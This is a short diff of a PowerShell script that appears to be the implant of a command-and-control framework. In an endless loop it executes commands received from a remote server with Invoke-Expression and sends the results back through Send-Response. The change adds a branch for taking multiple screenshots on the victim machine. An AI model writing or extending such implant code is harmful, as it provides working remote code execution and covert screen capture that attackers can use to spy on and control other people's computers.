@@ -266,7 +266,16 @@ while($true)
                                   $Output = "ErrorGetWebpage: " + $error[0]
                                   Send-Response $Server $key $id $Output
                               }
-                          }else {
+                          } elseif ($i.ToLower().StartsWith("get-screenshotmulti")) {
+                              try {
+                                  $i = $i + " -taskid " + $id
+                                  Invoke-Expression $i | Out-Null
+                              }
+                              catch {
+                                  $Output = "ErrorScreenshotMulti: " + $error[0]
+                                  Send-Response $Server $key $id $Output
+                              }
+                          } else {
                               try {
                                   $Output = Invoke-Expression $i | out-string
                                   $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
